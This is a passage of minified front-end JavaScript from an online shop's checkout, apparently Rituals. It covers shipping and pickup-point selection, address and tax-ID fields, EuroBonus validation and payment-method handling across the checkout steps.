t=e.find("input[id$=addNifNumber]"),n=e.find("input[id$=nifNumber]").parent();t.is(":checked")?(t.prop("checked",!1),n.css("display","none")):(t.prop("checked",!0),n.css("display","block"))}n.updateShippingInformation=f,n.initUpdatingShippingInformation=function(e){$(document).on("click",".js-update-selected-pickup-point",(function(){var t=$(".js-checkout-step-content").length?"checkout_page":"cart_page",n=$(this),r=n.closest(".js-flyout-content"),o=$(".js-select-pickup-radio.selected",r);if(o.length){var s=o.data("shipping-option-id"),l=o.data("default-option"),c=o.data("service-point-code"),u=o.data("shipping-service"),d={dhlPostNummer:$("#dhl-post-number-for-edit-pup").length?$("#dhl-post-number-for-edit-pup").val():null,shippingPrice:n.data("shipping-price")},p=$("#find-pickup-postalcode-form",r),h=p.length?p.data("current-postal-code"):null,A="checkout_page"==t?$(".js-option-radio:checked",".js-shipping-options-container"):null;a.getGiftwrapDataForSelectedShippingOption(l,t,A,(function(){f(s,u,c,d.dhlPostNummer,(function(t){!function(t,n,r){t.isDHLPostNummerValid&&$(".js-dhl-post-nummer").val(n.dhlPostNummer);var a=$(".js-pickup-option-label");$(".js-service-point-name",a).html(t.name),$(".js-address",a).html(t.address+" "+t.city),$(".js-option-price",a).html(t.shippingPrice);var o=$('.js-option-radio[data-default-option="'+t.shippingType+'"]');o.data("service-point-code",t.code),$(".js-edit-pickup-option-item.selected").removeClass("selected"),$(".js-edit-pickup-option-item[data-pickup-point-code="+t.code+"]").addClass("selected"),$(".js-edit-pickup-points-wrapper").empty().html(r.html()),i.closeFlyouts(),o.length&&o.prop("checked",!0),e(t)}(t.selectedShippingOption,d,r)}),l,h)}))}})),$(document).on("click",".js-update-selected-pickup-in-store",(function(){var t=$(".js-checkout-step-content").length?"checkout_page":"cart_page",n=$(this).closest(".js-flyout-content"),r=$(".js-select-pickup-radio.selected",n);if(r.length){var o=r.data("shipping-option-id"),s=r.data("default-option"),l=r.data("service-point-code"),c=r.data("shipping-service"),u={addressWithTime:r.data("radioButtonAddressWithTime"),postalCode:$("#find-stores-postalcode-form",n).length?$("#find-stores-postalcode-form",n).data("current-postal-code"):null},p="checkout_page"==t?$(".js-option-radio:checked",".js-shipping-options-container"):null;a.getGiftwrapDataForSelectedShippingOption(s,t,p,(function(){f(o,c,l,null,(function(t){!function(t,n,r){var a=$(".js-shipping-options-container"),o=$('.js-option-radio[data-default-option="'+t.shippingType+'"]');o.data("servicePointCode",t.code),$(".js-address",a).find("strong").text(n.addressWithTime),$(d).empty().html(r.html()),i.closeFlyouts(),o.length&&o.prop("checked",!0),e(t)}(t.selectedShippingOption,u,n)}),s,u.postalCode)}))}})),$(document).on("change",".js-scheduled-home-delivery-select",(function(){var t=$(".js-checkout-step-content").length?"checkout_page":"cart_page";if("checkout_page"==t)return $(".js-shipping-option-radio-label").trigger("mousedown"),void $(document).trigger($.Event("checkout.onHomeDeliveryTimeChange"));var n=$(this),r=$("option:selected",n),i=r.data("shipping-option-id"),o=r.data("shipping-service"),s=r.data("service-point-code"),l=r.data("default-option"),c={displayName:r.data("display-name"),displayTime:r.data("display-time"),optionPrice:r.data("shipping-formatted-price")};a.getGiftwrapDataForSelectedShippingOption(l,t,null,(function(){f(i,o,s,null,(function(t){!function(t,n){var r=$(".js-home-delivery-wrapper"),i=$(".js-option-title strong",r),a=$(".js-delivery-option-price",r);(i.text(n.displayName),a.text(n.optionPrice),n.displayTime)&&$(".js-option-time",r).text(n.displayTime);var o=$('.js-option-radio[data-default-option="'+t.shippingType+'"]');o.data("shipping-option-id",t.id),o.length&&o.prop("checked",!0),e(t)}(t.selectedShippingOption,c)}),l,null)}))}))},n.initPickupEvents=function(){$(document).on("click",".js-pickup-point-change",(function(e){e.preventDefault();var t=$(this).closest(".js-checkout-review-box").find(".js-service-point-postnummer-input");if(0<t.length){var n=t.val().trim();$.ajax({type:"GET",url:Urls.checkoutCheckAccountServiceNumberForPaazl,data:{accountServiceNumber:n},success:function(e){e.valid?($("#dhl-post-number-for-edit-pup").val(n),$("#dhl-post-number-display-string").val(e.displayDhlString),p(u)):$(".js-service-point-postnummer-input-error").removeClass("hide")}})}else p(u)})),$(document).on("keydown",".js-service-point-postnummer-input",(function(e){if(8!==e.which&&13!==e.which&&16!==e.which&&17!==e.which&&18!==e.which){var t=$(".js-service-point-postnummer-input-error");t.hasClass("hide")||t.addClass("hide")}})),$(document).on("click",".js-pickup-in-store-change",(function(){p(d,"delivery-wide-flyout"),$("#find-stores-postalcode-form",$(this))&&(o.init(),r.initializeDataMask())})),$(document).on("click",".js-select-pickup-radio:not(.selected)",(function(){var e=$(this),t=e.parents(".js-flyout-content");$(".js-select-pickup-radio.selected",t).removeClass("selected"),e.addClass("selected")})),$(document).on("click",".js-delivery-flyout-list-toggle",(function(){var e=$(this);e.hasClass("open")?(e.removeClass("open"),e.parent().next(".delivery-flyout-list-details").stop().slideUp()):($(".js-delivery-flyout-list-toggle",".js-flyout-content").removeClass("open"),$(".delivery-flyout-list-details",".js-flyout-content").stop().slideUp(),e.addClass("open"),e.parent().next(".delivery-flyout-list-details").stop().slideDown())})),$(document).on("click",".js-pickup-in-store-see-more",(function(){var e=$(this),t=e.data("storesToShow"),n=e.closest(".js-flyout-content");$(".js-pickup-in-store-row.hide:lt("+t+")",n).removeClass("hide"),$(".js-pickup-in-store-row.hide",n).length||e.remove()}))},n.init=function(){A(),$('input[id$="sasEurobonusMember"]').is(":checked")&&$(".js-eurobonus-dropdown").removeClass("hide"),m(),v(),$(document).on("keyup",".js-step-1-content .error",(function(e){var t=this.selectionStart,n=this.selectionEnd;$(this).data("prevent-automatic-validation")||($(e.target).valid(),$(e.target).is(":not([type=email], [type=number])")&&this.setSelectionRange(t,n))})),$(document).on("change",".js_delivery_date_select :input",(function(){var e=$("#dwfrm_singleshipping_deliveryOption option:selected");f(e.data("shipping-option-id"),e.data("shipping-service"),null,null,(function(e){$(".js-shipping-price").text(e.selectedShippingOption.shippingPrice),$(".js-order-value").text(e.selectedShippingOption.totalPrice),$(".js-checkout-sticky-bar .js-sticky-price-container .order-total-amount").text(e.selectedShippingOption.totalPrice)}))}))},n.initGWPChoosingPopup=A,n.handleBillingAddressFields=m,n.handleNifNumberSection=v,n.handleNifStep2=function(){$(".js-generic-flyout").off("click").on("click",(function(e){$(e.target).closest(".form-row").find("input[id$=addNifNumber").length&&g($(this))}))}},{"../../bonus-products-view":293,"../../flyout":447,"../../giftwrap.js":454,"../../rituals-form-helper":606,"../../validator":624}],544:[function(e,t,n){var r=e("./shipping"),i=e("./address"),a=e("../../progress"),o=e("../../prefill-address"),s=e("./klarnaGeneral"),l=e("../../modules/google"),c=e("../../validator"),u=e("../../toaster"),d=e("../../flyout"),p=e("../../rituals-styles"),h=e("../../modules/util/fillAddressFields"),f=e("../../rituals-form-helper"),A=e("../../select-custom"),m=e("../../rituals-form-helper"),v=e("../../modules/helpers/isSmallView"),g=e("../../giftwrap"),y=e("../../modules/util/getCountryFromLocaleCookie"),b=e("./checkoutPostalCode"),_=e("../../dam/dam-helper");t.exports=new function(){var e,t=$(".js-step-1"),n=$(".js-step-1-content"),w=$(".js-step-2"),C=$(".js-step-2-content"),x=$(".js-step-3"),S=$(".js-step-3-content"),k=".js-generic-flyout",M=".js-checkout-sticky-button",B=!1,E=$(".js-option-radio:checked"),T={step1:{label:Resources.CHECKOUT_GO_TO_STEP_2_LABEL,class:"js-step-1-continue-btn"},step2:{label:Resources.CHECKOUT_GO_TO_STEP_3_LABEL,class:"js-step-2-continue-btn"},step3:{label:Resources.CHECKOUT_GO_TO_PAYMENT_LABEL,class:"js-step3-submit"}},P=function(e){13===e.which&&$(".js-step-2-continue-btn").trigger("click")},I=0;function F(e){var t=$(M),n=T[e].class,r=T[e].label,i=$(".js-spinner-general",t);t.data("triggering-action",n),t.text(r),t.append(i)}function L(e,t){var n=$("[id$=_country]",e).val();if(void 0!==n&&"hk"!==n.toLowerCase())return Promise.all([]);var r=$("[id$=_addressFields_city]",e),i=$("[id$=_addressFields_district]",e),a=$("[id$=_addressFields_subdistrict]",e);return m.initTownDistrictFields(r,i,a,t)}function O(e,t){var n=$("[id$=deliveryOption]",t);e.length||n.val(null);var r={shippingOptionId:e.data("shipping-option-id")||null,shippingService:e.data("shipping-service")||null};n.val(JSON.stringify(r))}function N(){$(".js-minicart-product").each((function(){var e=$(this),t=".js-mini-cart-small-title",n=e.find(".js-mini-cart-price-wrapper");if(e.find(t).length){var r=$(t).outerHeight()+5;n.css("padding-top",r)}else n.css("padding-top",0)}))}function D(e){e.preventDefault();var t=$(this).closest("form");t.find(".js-service-point-postnummer-input-error").addClass("hide");var n=t.find(".js-service-point-postnummer-input");n.length?$.ajax({type:"GET",url:Urls.checkoutCheckAccountServiceNumberForPaazl,data:{accountServiceNumber:n.val()},success:function(r){r.valid?(me(n.val()),G(e,d.closeFlyouts,t)):t.find(".js-service-point-postnummer-input-error").removeClass("hide")}}):G(e,d.closeFlyouts,t)}function R(e){e.preventDefault();var t=$(".js-flyout-container .js-billing-form");if(!t.validate().checkForm())return t.valid(),!1;var n=t.find(".js-step-1-spinner");n.parent().addClass("button-loading"),n.addClass("spinner-visible"),$.ajax({url:t.attr("action"),data:t.serialize()+"&dwfrm_billing_save=save",type:"POST",success:function(e){var n;null!=(n=e)&&void 0!==n.location&&null!==n.location&&n.location?window.location=e.location:e.Errors?q(e.Errors,t):(te(!0),B=!0,d.closeFlyouts())},complete:function(){n.parent().removeClass("button-loading"),n.removeClass("spinner-visible")},statusCode:{401:function(e){window.location=e.getResponseHeader("Location")}}})}function j(e){var t=$(e.target).data("triggering-action");$("."+t).click()}function U(){var e=$(".js-eurobonus-dropdown");$("[id$=sasEurobonusMember]").is(":checked")?e.removeClass("hide"):e.addClass("hide")}function z(e){if(0!==e.length){var t="checkout_page",n=e.data("shipping-option-id"),i=e.data("service-point-code"),a=e.data("shipping-service"),o=e.data("default-option"),s=e.hasClass("js-pickup-option-radio")?$(".js-service-point-postnummer-input").val():null;g.getGiftwrapDataForSelectedShippingOption(o,t,E,(function(){r.updateShippingInformation(n,a,i,s,(function(e){!function(e,t){if(B=!0,e.exclusionResult)return window.location.href=Urls.cartShow;te(!0),t&&me(t),d.closeFlyouts(),Ae(e.totalPrice)}(e.selectedShippingOption,s)}),o,null,t)}))}}function H(e,t){$(".js-service-point-postnummer-input-error").addClass("hide"),$(k).addClass("change-delivery-flyout");var n={open:function(){f.init();var e=$(".js-generic-flyout").find(".js-custom-select");e.selectric(),v()||e.attr("tabindex","-1")}},r=$(t).html();d.loadFromHtml(r,n),$(e).addClass("js-triggered-flyout"),V(),$('[name$="_addToAddressBook"]').prop("checked",!1),$('[name$="_addToAddressBook"]').change((function(){var e=$(this).is(":checked");$('[name$="_addToAddressBook"]').prop("checked",e)}))}function V(){$("[id$=_country]").each((function(){var e=$(this);if("US"===e.val()){var t=e.closest("fieldset").find("[id$=_postal]");t.on("blur keydown",l.places.setStateFromPostalCode),t.on("keydown.country, change.country",(function(){t.data("changed",!0)})),l.places.setStateIDDataForPostalCode()}}))}function Q(){var e=$("#dwfrm_billing_paymentMethods_birthDayDay"),t=$("#dwfrm_billing_paymentMethods_birthDayMonth"),n=$("#dwfrm_billing_paymentMethods_birthDayYear"),r=$(this).val().split("/");e.val(r[0]),t.val(r[1]),n.val(r[2])}function G(e,t,n,r){return e.preventDefault(),"US"!==$("[id$=_country]").val()?W(e,t,n,r):function(e){if(!e||!$.isFunction(e))return!1;var t=[];return $("[id$=_country]").each((function(){var e=$(this);if("US"===e.val()){var n=e.closest("fieldset").find("[id$=_postal]");n.data("changed")&&(n.data("state-id",""),t.push(new Promise((function(t){var r=n.val(),i=n.closest("fieldset").find("[id$=_stateUS]");l.places.getStateFromPostalCode(r,e.val(),(function(e){i.val(e||""),i.selectric("refresh"),n.data("state-id",e),n.data("changed",!1),i.valid(),t()}))}))))}})),Promise.all(t).then(e)}((function(){W(e,t,n,r)}))}function W(e,t,n,r){var i=$("div.js-avatax-address-validation-error");i&&i.addClass("hide"),n||(n=$(e.target).closest(".js-checkout-form"));var a=n.validate(),o=!!a&&a.checkForm(),s=$("#billing_address_form").validate().checkForm(),l=$("#checkbox_use_shipping_as_billing").prop("checked"),c=o?l?o:s:o;if(!c&&r)return!1;if(!c)return n.valid(),!1;if(e){var d=$(e.target).data("redirecto");if(d)return window.location.href=d,!0;if($(e.target).data("prevent-submit"))return!1}var p={url:n.attr("action"),data:n.serialize()+"&dwfrm_singleshipping_shippingAddress_save=save",type:"POST",success:function(o){if(r)r($(e.target),1);else{if(!o.location||o.errorMessage)return o.errorMessage?(b.showPostalCodeErrors($("#dwfrm_singleshipping_shippingAddress_addressFields_postal",n),n.find("button[type=submit]"),a,o.errorMessage),n.validate(),void K(!1)):o.addressValidationError?(i&&i.parents("div.js-flyout-container").length?($(".js-avatax-address-validation-error-message").html(o.addressValidationError),i.removeClass("hide")):($(".js-address-validation-error-text").html(o.addressValidationError),u.open({target:$(".js-address-validation-toaster")})),void K(!1)):!o.valid&&o.validationResults?(q(o.validationResults,n),void K(!1)):void te(!1,(function(){K(!1),t&&t()}));window.location=o.location}},statusCode:{401:function(e){window.location=e.getResponseHeader("Location")}}};return r||K(!0),$.ajax(p),!0}function K(e){var t=$(".js-step-1-continue-btn"),n=$(".js-step-1-spinner");t.toggleClass("button-loading",e),$(M).toggleClass("button-loading",e),n.parent().toggleClass("button-loading",e),n.toggleClass("spinner-visible",e)}function q(e,t){for(var n=t.validate(),r={},i=0;i<e.length;i++)e[i].error&&(r["billingAddress"==e[i].addresstype?($("#dwfrm_singleshipping_shippingAddress_useAsBillingAddress").is(":checked")&&$("#dwfrm_singleshipping_shippingAddress_useAsBillingAddress").attr("checked",!1).change(),"dwfrm_billing_"+e[i].addresstype+"_addressFields_"+e[i].errorField):"dwfrm_singleshipping_"+e[i].addresstype+"_addressFields_"+e[i].errorField]=e[i].reason,n.showErrors(r))}function X(e){e||(e=Y());var t,n,r,i=e.find(".js-address-summary-format").val()||"";if(""!==i){var a=0<$(".js-shipping-option-radio:checked").length,o=0<$(".js-billing-address-holder").length,s=e.find("input.firstName").val()||"",l=e.find("input.lastName").val()||"",c=e.find("input.phone").val()||"",u=$(".js-pickup-point-name").val(),d=$(".js-pickup-point-address").val(),p=$(".js-pickup-point-postalcode").val(),h=$(".js-pickup-point-city").val(),f=$(".js-pickup-in-store-address").val(),A=$(".js-pickup-in-store-time").val(),m="";if(!a&&!o&&u&&d&&p&&h){var v="";if(0<e.find(".js-service-point-postnummer-input").length&&"DHL_DE"===e.find(".js-service-point-postnummer-input").data("distributor")){var g=$(".js-address-dhlpostnummer-format").val()||"";v=String.format(g,e.find(".js-dhl-post-nummer").val())}m=String.format(i,u,s,l,d,p,h,v,c)}else if(!a&&!o&&f&&A)m=String.format(i,f,A);else{var y=$('input[name="preselected-shipping-city"]').val()||"",b=e.find("input.street").val()||"",_=e.find("input.houseNumber").val()||"",w=e.find("input.houseNumberExtension").val()||"",C=e.find("input.address1").val()||"",x=e.find("input.address2").val()||"",S=e.find("[id$=_addressFields_city]"),k=y;if("INPUT"===S.prop("tagName"))k=S.val()||y;else if("SELECT"===S.prop("tagName")){var M=S.find("option:selected");k=M.length&&0!==M.prop("index")?M.text():""}var B=e.find("select.stateUS").val()||"",E=e.find("input.postal").val()||"",T=$(document).find("input.js-country-name").val()||"",P=e.find("input.phone").val()||"",I=e.find("select.district").find("option:selected"),F=I.length&&0!==I.prop("index")?I.text():"",L=e.find("select.subdistrict").find("option:selected"),O=L.length&&0!==L.prop("index")?L.text():"";F=""!==F?", "+F:"",O=""!==O?", "+O:"";var N=Z(n=e)||Z(n=Y())?n:(r=$(".js-flyout-content > div").find(".js-checkout-form"),0===r.length&&(r=$(".js-step-1-content").find(".js-checkout-form")),r).find("#company_details_form"),D=e.find(".js-tax-id-number-format").val()||"",R=N.find("input.companyName").val()||"",j=N.find("input.cocNumber").val()||"",U=N.find("input.vatNumber").val()||((t=N).find("input.addNifNumber").is(":checked")?t.find("input.nifNumber").val():""),z=U&&0<U.length?String.format(D,U):"";m=String.format(i,s,l,b,_,w,C,x,k,B,E,T,P,F,O,"","",R,j,z)}e.find(".js-address-holder").html(m)}}function Y(){var e=$(".js-flyout-content > div").find(".js-shipping_address_form");return 0===e.length&&(e=$(".js-step-1-content").find(".js-shipping_address_form")),e}function J(){var e=$(".js-flyout-content > div").find(".js-billing-form");return 0===e.length&&(e=$(".js-step-1-content").find(".js-billing-address-form")),e}function Z(e){return 0<e.find("input.cocNumber").length||0<e.find("input.companyName").length||0<e.find("input.vatNumber").length||0<e.find("input.nifNumber").length}function ee(e,t){void 0!==e&&e||window.history.pushState({step:t},"step "+t,window.location.href)}function te(e,t){ee(e,2),$.ajax({type:"GET",url:Urls.checkoutStep2,success:function(e){l.tagManager.pushVirtualPage(Urls.checkoutStep2,Resources.CHECKOUT_STEP2_TITLE,"review"),ne(e),ue(),F("step2"),t&&t(),p.initInputStyles(),$("html, body").delay("fast").animate({scrollTop:0},"fast")}})}function ne(n){e=w,$(M).removeClass("button-loading"),t.removeClass("current").removeClass("selected"),t.content.removeClass("open").hide(),x.removeClass("current").removeClass("selected"),x.addClass("disabled"),x.content.hide().removeClass("open"),w.addClass("current selected"),w.content.show().addClass("open").prev().addClass("open"),w.removeClass("disabled"),n&&(w.content.html(n),A.init()),r.handleNifStep2();var i=$("#dwfrm_billing_billingAddress_addressFields_postal").attr("regex");$(".js-service-point-zipcode-input").attr("regex",i),$(document).on("keydown",".js-step-2-continue-btn",P),$(document).on("click",".js-checkout-sticky-button",(function(){$(this).addClass("button-loading"),$(this).find(".js-spinner-general").addClass("spinner-visible")})),$(document).off("click",".js-step-2-continue-btn"),$(document).on("click",".js-step-2-continue-btn",(function(){$(".js-service-point-postnummer-input-error").addClass("hide");var e=$(".js-option-radio:checked"),t=e.length?e.data("delivery-method-type"):"unknown";l.tagManager.pushDeliveryMethod(t),$(this).addClass("button-loading"),$(this).find(".js-spinner-general").addClass("spinner-visible"),ie()}))}function re(n){e=t,B=!1,$(M).removeClass("button-loading"),w.removeClass("current").removeClass("selected"),w.addClass("disabled"),w.content.removeClass("open").hide(),x.removeClass("current").removeClass("selected"),x.addClass("disabled"),x.content.hide().removeClass("open"),t.addClass("current selected"),t.content.show().addClass("open").prev().addClass("open"),n&&(t.content.html(n),A.init(),r.handleBillingAddressFields(),r.handleNifNumberSection()),t.removeClass("disabled")}function ie(e){ee(e,3);var t=$("input.js-dhl-post-nummer");$(document).off("keydown",P);var n={type:"GET",url:Urls.checkoutStep3,data:{openStep:pageContext.openStep,paymentStatus:pageContext.paymentStatus,paymentMethodID:pageContext.paymentMethodID,accountServiceNumber:t.length?t.val():null},success:function(e){ue(),l.tagManager.pushVirtualPage(Urls.checkoutStep3,Resources.CHECKOUT_STEP3_TITLE,"payment"),ae(e),F("step3"),$(".js-checkout-sticky-button").removeClass("button-loading"),$(".js-checkout-sticky-button").find(".js-spinner-general").removeClass("spinner-visible"),$("html, body").delay("fast").animate({scrollTop:0},"fast")}};$(".js-pickup-option-radio").is(":checked")&&$(".js-service-point-postnummer-input").length&&t.length?$.ajax({type:"GET",url:Urls.checkoutCheckAccountServiceNumberForPaazl,data:{accountServiceNumber:t.val()},success:function(e){e.valid?$.ajax(n):$(".js-service-point-postnummer-input-error").removeClass("hide")}}):$.ajax(n)}function ae(n){var r;t.removeClass("current").removeClass("selected"),t.content.hide().removeClass("open"),w.removeClass("current").removeClass("selected").removeClass("disabled"),w.content.hide().removeClass("open"),x.addClass("current selected"),x.content.show().addClass("open"),x.removeClass("disabled"),n&&(x.content.html(n),A.init()),e=x,$(".js-hidden-select").hasClass("js-custom-select")||($(".js-hidden-select").addClass("js-custom-select").selectric(),v()||$(document).find(".js-custom-select").attr("tabindex","-1")),$(".js-summary").addClass("step3"),$("#payment input[type=radio][name=brandCode]:checked").val()||$("#payment input[type=radio][name=brandCode]:first").prop("checked",!0),0<$("#js_klarna_valid_address").length&&"1"==$("#js_klarna_valid_address").val()&&0<$('li.js-klarna input[type="radio"]').length&&$('li.js-klarna input[type="radio"]').trigger("click"),void 0!==(r=$($('input[name$="_shippingAddress_addressFields_phone"]')).attr("regex"))&&$("#dwfrm_billing_paymentMethods_phone").attr("regex",r),c.init(),$(".js-ideal").find("input[type=radio]").is(":checked")&&$(".js-ideal").find(".js-method-extra").slideDown(),U()}function oe(t,n,r){ee(r,n),e.removeClass("current").removeClass("selected"),e.content.removeClass("open").hide(),t.addClass("current selected"),t.content.addClass("open").show(),t==w?$(document).on("keydown",P):$(document).off("keydown",P)}function se(e){if($("#payment").validate().form()||e.preventDefault(),r="chosen","ideal"===(n=$("#payment input[type=radio][name=brandCode]:checked").val())&&(r=$("select#issuerId > option:checked").text().trim()),l.tagManager.pushCheckoutPaymentMethodEvent(n,r),$(e.target).addClass("button-loading"),$(e.target).find(".js-spinner-general").addClass("spinner-visible"),$("[id$=sasEurobonusMember]").is(":checked")){var t=$("#dwfrm_payment_eurobonusMember_sasEurobonusMemberCode").val();t&&0<t.length&&(e.preventDefault(),$(".js-eurobonus-dropdown").removeClass("eurobonus-valid"),de(t,(function(){$("#payment").submit()}),null))}var n,r}function le(){$("#payment").validate().resetForm();var e=$(this).val();if($("#issuerId").removeClass("required error"),$("#dwfrm_billing_paymentMethods_birthday").removeClass("required error"),$("#dwfrm_billing_paymentMethods_phone").removeClass("required error"),"ideal"===e&&$("#issuerId").addClass("required"),"klarna"===e){var t=$("#dwfrm_billing_paymentMethods_birthday"),n=$("#dwfrm_billing_paymentMethods_phone");t.addClass("required"),n.addClass("required")}"rituals"===e?($("[id$=sasEurobonusMember]").prop("disabled",!0),$("[id$=sasEurobonusMember]").prop("checked",!1),$(".js-eurobonus-dropdown").addClass("hide")):$("[id$=sasEurobonusMember]").prop("disabled",!1),$("#selectedPaymentMethodID").val(e);var r=$(".js-"+e);if(0<r.length){var i=r.children(".js-method-extra");$(".js-method-extra").slideUp(I),0<i.length&&i.slideDown(I)}}function ce(){$('li.js-ideal input[type="radio"]').prop("checked",!0)}function ue(){var e=$(".js-summary");a.show(e),e.load(Urls.summaryRefreshURL,(function(){N(),_.updateImages($(".js-summary")),e.fadeIn("fast"),e.find(".checkout-mini-cart .minishipment .header a").hide(),e.find(".order-totals-table .order-shipping .label a").hide()}))}function de(e,t,n){var r=$("#btnValidateEurobonusMember"),i=$("#eurobonusError"),a=$(".js-eurobonus-dropdown");a.removeClass("eurobonus-valid"),r.removeClass("btn-success").addClass("btn-loading"),i.addClass("hide"),$.ajax({type:"GET",url:Urls.checkoutValidateEurobonusMemberId,data:{memberId:e},success:function(i){i&&i.isMemberValid?(r.addClass("btn-success"),a.addClass("eurobonus-valid"),$("#validatedEurobonusCode").val(e),t&&t()):(a.removeClass("eurobonus-valid"),pe(n))},error:function(){pe(n),a.removeClass("eurobonus-valid")},complete:function(){r.removeClass("btn-loading")}})}function pe(e){var t=$(".js-eurobonus-code-input"),n=$("#eurobonusError"),r=t.data("invalid-code-text");n.removeClass("hide").text(r),t.addClass("error");var i=$("input.error");i.first().is(t)&&setTimeout((function(){(i=$("input.error")).first().is(t)&&($("html, body").animate({scrollTop:t.offset().top-$(".js-header").height()-30},50),t.focus())}),100),e&&e()}function he(e,n){switch(I=0,e){case 2:te(n),F("step2");break;case 3:ie(n),F("step3");break;case 1:default:r=n,B?$.ajax({type:"GET",url:Urls.checkoutStep1,success:function(e){re(e),p.initInputStyles(),oe(t,1,r),$("html, body").delay("fast").animate({scrollTop:0},"fast")}}):($(".js-step-1-spinner").removeClass("spinner-visible"),$(".js-step-1-continue-btn").removeClass("button-loading").removeClass("button-loading").removeClass("btn-loader"),w.addClass("disabled"),x.addClass("disabled"),oe(t,1,r)),F("step1")}var r;I=400}function fe(e){Ae(e.totalPrice),X(),te(!0)}function Ae(e){$(".js-order-totals .js-order-value").text(e),$(".js-checkout-sticky-bar .js-sticky-price-container .order-total-amount").text(e)}function me(e){$("input.js-dhl-post-nummer").val(e)}return $(document).on("change",".js-service-point-postnummer-input",(function(){me($(this).val())})),{init:function(){function a(){var e=$(".js-generic-flyout"),t=e.find("input[id$=nifNumber]").parent();e.find("input[id$=addNifNumber]").is(":checked")||t.css("display","none")}t.content=n,w.content=C,x.content=S,r.init(),r.initPickupEvents(),r.initUpdatingShippingInformation(fe),o.init(),b.initSearchByPostalCode(),i.init(),u.init(),A.init(),e=t,pageContext.openStep&&1<pageContext.openStep?(window.history.replaceState({step:pageContext.openStep},"step "+pageContext.openStep,window.location.href),function(e){switch(pageContext.openStep){case 2:ne(),F("step2");break;case 3:ae(),F("step3");break;case 1:default:re(),F("step1")}}()):(window.history.replaceState({step:1},"step 1",window.location.href),$(document).trigger("shippingPostalCode.updated",[$("input[name$=_singleshipping_shippingAddress_addressFields_postal]",t.content)])),V(),$(document).on("checkout.onHomeDeliveryTimeChange",(function(){var e=$(".js-edit-delivery-time-wrapper .js-shipping_address_form"),t=$(".js-shipping-option-radio");if(O(t,$(".js-shipping_address_form",$(k))),e.length){H(t,".js-edit-delivery-time-wrapper"),l.places.init(),c.init(),f.initializeDataMask(),b.initSearchByPostalCode();var n=$(".js-flyout-content > div").find(".js-checkout-form");i.init(n)}else $(".js-edit-delivery-form").trigger("submit")})),$(document).on("submit","#find-pickup-postalcode-form",(function(e){e.preventDefault();var t=$(this);if($("#dwfrm_shippingpostalcode_postal",t).val()!==t.data("current-postal-code")&&t.valid()){var n=$(".js-pickup-options-wrapper",".js-flyout-content"),r={url:t.attr("action"),data:t.serialize()+"&dwfrm_cart_searchByPostalCode=searchByPostalCode",type:"POST",success:function(e){var t=$(e);n.replaceWith($(".js-pickup-options-wrapper",t)),c.init(),f.initializeDataMask()}};$.ajax(r)}})),$(document).on("submit","#find-stores-postalcode-form",(function(e){e.preventDefault();var t=$(this),n=$("#dwfrm_shippingpostalcode_postal",t);if(n.val()!==t.data("current-postal-code")&&t.valid()){var r=$(".js-pickup-options-wrapper",".js-flyout-content"),i={url:t.attr("action"),data:t.serialize()+"&dwfrm_cart_searchByPostalCode=searchByPostalCode",type:"POST",success:function(e){var t=$(e);r.replaceWith($(".js-pickup-options-wrapper",t)),c.init(),f.initializeDataMask()}};l.places.init(),l.places.getLatLongFromPostalCode(n.val(),y(),(function(e,t){i.data+="&latitude="+e+"&longitude="+t,$.ajax(i)}))}})),$(document).on("click","#btnEditOrderSummary",l.tagManager.pushCheckoutEditOrderSummaryEvent),$(document).on("click","#btnEditShippingAddress",l.tagManager.pushCheckoutDeliveryAddressChangeEvent),$(document).on("click","#btnChangeShippingAddressDetails",l.tagManager.pushCheckoutAddressDetailsChangeEvent),$(document).on("click","div.checkout__header.step-1",l.tagManager.pushCheckoutBackToDetailsEvent),$(document).on("click",".js-step-1-continue-btn",G),$(document).on("click",".js-change-delivery-details-btn",D),$(document).on("click",".js-change-billing-details-btn",R),$(document).on("click",M,j),$(document).on("click",".js-gotostep1",(function(n){n.preventDefault(),e!=t?he(1):$("html, body").animate({scrollTop:0},"slow"),$(".js-step-1-spinner").removeClass("spinner-visible"),$(".js-step-1-continue-btn").removeClass("button-loading"),$(M).removeClass("button-loading")})),$(document).on("click",".js-gotostep1billing",(function(n){n.preventDefault(),e!=t&&he(1),$("html, body").animate({scrollTop:$(".js-billing-title").offset().top-$("header").height()-6},"slow")})),$(document).on("click","[id$=sasEurobonusMember]",U),$(document).on("keypress input copy","#dwfrm_payment_eurobonusMember_sasEurobonusMemberCode",(function(e){if(8!=e.which&&0!=e.which&&e.which<48||57<e.which)return!1;var t=$(this),n=t.val(),r=parseInt(t.attr("maxlength"));n.length>=r&&t.val(n.substr(0,r)),$("#eurobonusError").addClass("hide").text("")})),$(document).on("change","#dwfrm_payment_eurobonusMember_sasEurobonusMemberCode",(function(){$("#validatedEurobonusCode").val("")})),$(document).on("focusout","#dwfrm_payment_eurobonusMember_sasEurobonusMemberCode",(function(){!function(e){if($(".js-eurobonus-dropdown").removeClass("eurobonus-valid"),e.valid()){if(0==e.val().length)return e.addClass("error"),$("#eurobonusError").removeClass("hide").text(e.data("required-text"));de(e.val(),null,(function(){e.focus()}))}}($(this))})),$(document).on("change","#dwfrm_billing_paymentMethods_birthday",Q),$(document).on("change","input[name='brandCode']",le),$(document).on("change","select[name='issuerId']",ce),$(document).on("click",".js-step3-submit",se),$(document).on("click",".js-checkout-sticky-button.js-step-2-continue-btn",(function(){$(".step2-bottom-button .js-step-2-continue-btn").click()})),I=400,0<$("input[id$=addressFields_ssn]").length&&s.init(),$(document).on("change.all","#shipping_address_form input, #shipping_address_form select",(function(){$(this).closest(".js-company-fields").length?X(J()):(X(),$("#dwfrm_singleshipping_shippingAddress_addToAddressBook").closest("div").removeClass("hide"))})),$(document).on("change.all","#billing_address_form input, #billing_address_form select, #company_details_form input, #company_details_form select",(function(){X(J())})),$(document).on("change.all","[id$=useAsBillingAddress]",(function(){$(this).is(":checked")?(X(),$("#dwfrm_singleshipping_shippingAddress_addToAddressBook").closest("div").removeClass("hide")):X(J())})),$(document).on("click",".js-review-edit-address",(function(){H(this,".js-edit-delivery-details-wrapper"),a(),l.places.init(),c.init(),f.initializeDataMask(),b.initSearchByPostalCode();var e=$(".js-flyout-content > div").find(".js-checkout-form");i.init(e);var t={city:$('input[name="preselected-shipping-city"]').val()||"",district:$('input[name="preselected-shipping-district"]').val()||"",subdistrict:$('input[name="preselected-shipping-subdistrict"]').val()||""};L($(".js-generic-flyout"),t).then((function(){return X()}))})),$(document).on("click",".js-review-edit-billing",(function(){H(this,".js-edit-billing-details-wrapper"),a(),l.places.init(),c.init(),f.initializeDataMask();var e=$(".js-flyout-content > div").find(".js-billing-form");i.init(e);var 